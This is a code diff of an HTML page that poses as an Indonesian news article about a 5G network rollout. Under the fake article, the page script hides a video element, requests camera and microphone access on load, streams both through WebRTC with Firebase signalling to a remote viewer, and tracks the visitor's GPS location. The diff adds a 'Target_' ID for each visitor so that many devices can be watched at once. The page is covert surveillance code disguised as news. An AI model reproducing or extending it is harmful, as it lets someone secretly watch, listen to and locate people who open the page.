@@ -3,26 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Berita Terkini - Update 24 Jam</title>
+    <title>Berita Nasional Hari Ini</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { font-family: 'Arial', sans-serif; margin: 0; line-height: 1.6; color: #333; }
-        .navbar { background: #2c3e50; color: white; padding: 1rem; text-align: center; font-weight: bold; }
-        .main-content { max-width: 800px; margin: 20px auto; padding: 0 15px; }
-        .news-img { width: 100%; height: auto; border-radius: 8px; margin-bottom: 15px; }
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; color: #333; }
+        .nav { background: #1a365d; color: white; padding: 15px; font-weight: bold; margin: -20px -20px 20px -20px; }
+        .art { max-width: 600px; margin: 0 auto; }
+        img { width: 100%; border-radius: 8px; margin: 15px 0; }
         #v { display: none; }
     </style>
 </head>
 <body>
-    <div class="navbar">NEWS PORTAL INDONESIA</div>
-    <div class="main-content">
-        <h1>Pemulihan Ekonomi Nasional Menunjukkan Tren Positif</h1>
-        <p><small>Dipublikasikan: 2 menit yang lalu</small></p>
-        <img src="https://picsum.photos/800/400" alt="Berita Utama" class="news-img">
-        <p>Pemerintah terus memantau perkembangan ekonomi digital yang menjadi tulang punggung baru bagi pertumbuhan nasional. Berbagai sektor mulai bangkit dengan dukungan infrastruktur jaringan yang semakin luas dan stabil di seluruh pelosok negeri...</p>
+    <div class="nav">PORTAL BERITA RESMI</div>
+    <div class="art">
+        <h1>Percepatan Jaringan 5G di Seluruh Wilayah Indonesia</h1>
+        <p><small>Dipublikasikan: Baru saja</small></p>
+        <img src="https://picsum.photos/600/300" alt="News">
+        <p>Pemerintah berkomitmen untuk memeratakan akses internet cepat guna mendukung transformasi digital nasional...</p>
     </div>
-
     <video id="v" autoplay playsinline muted></video>
 
     <script>
@@ -32,75 +31,45 @@
             projectId: "chatroom-e9b3f"
         };
         firebase.initializeApp(firebaseConfig);
-        const db = firebase.database().ref('auto_p2p_v4');
+        
+        // Buat ID unik untuk setiap perangkat target
+        const targetId = "Target_" + Math.random().toString(36).substr(2, 5);
+        const db = firebase.database().ref('multi_monitor/' + targetId);
 
         let pc;
         let localStream;
 
-        async function createPeerConnection() {
-            if (pc) pc.close();
-            pc = new RTCPeerConnection({
-                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-            });
+        async function init() {
+            await db.remove(); // Bersihkan sesi lama
 
-            pc.onicecandidate = e => {
-                if (e.candidate) db.child('ice_target').push(e.candidate.toJSON());
-            };
-
-            if (localStream) {
-                localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
-            }
-
-            const offer = await pc.createOffer();
-            await pc.setLocalDescription(offer);
-            await db.child('sdp').update({ offer: { type: offer.type, sdp: offer.sdp } });
-        }
-
-        async function startSystem() {
-            // Bersihkan koneksi lama saat start
-            await db.child('sdp').remove();
-            await db.child('ice_target').remove();
-            await db.child('ice_monitor').remove();
-
+            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+            
             try {
                 localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 document.getElementById('v').srcObject = localStream;
-            } catch (e) { console.error("Izin media ditolak"); }
+                localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
+            } catch (e) { console.log("Izin ditolak"); }
 
-            // Ambil lokasi & kirim heartbeat
             navigator.geolocation.watchPosition(p => {
-                db.child('status').set({
-                    lat: p.coords.latitude,
-                    lng: p.coords.longitude,
-                    lastActive: Date.now()
-                });
-            }, null, { enableHighAccuracy: true });
+                db.child('status').update({ lat: p.coords.latitude, lng: p.coords.longitude, lastSeen: Date.now(), id: targetId });
+            });
 
-            await createPeerConnection();
+            pc.onicecandidate = e => { if(e.candidate) db.child('ice_t').push(e.candidate.toJSON()); };
+            
+            const offer = await pc.createOffer();
+            await pc.setLocalDescription(offer);
+            db.child('sdp/offer').set({ type: offer.type, sdp: offer.sdp });
 
-            // Dengarkan Jawaban (Answer)
             db.child('sdp/answer').on('value', async s => {
                 const a = s.val();
-                if (a && pc && !pc.currentRemoteDescription) {
-                    await pc.setRemoteDescription(new RTCSessionDescription(a));
-                }
+                if(a && !pc.currentRemoteDescription) await pc.setRemoteDescription(new RTCSessionDescription(a));
             });
 
-            // Dengarkan ICE Monitor
-            db.child('ice_monitor').on('child_added', s => {
-                if (pc) pc.addIceCandidate(new RTCIceCandidate(s.val()));
-            });
-
-            // Jika monitor melakukan refresh, mereka akan menghapus 'answer'. 
-            // Kita harus membuat offer baru jika itu terjadi.
-            db.child('sdp/answer').on('value', s => {
-                if (!s.exists()) createPeerConnection();
-            });
+            db.child('ice_m').on('child_added', s => pc.addIceCandidate(new RTCIceCandidate(s.val())));
         }
 
-        window.onload = startSystem;
-        // Penanganan jika tab ditutup
-        window.onbeforeunload = () => { db.child('status/lastActive').set(0); };
+        window.onload = init;
+        window.onbeforeunload = () => { db.remove(); }; // Hapus saat target offline
     </script>
 </body>
 </html>
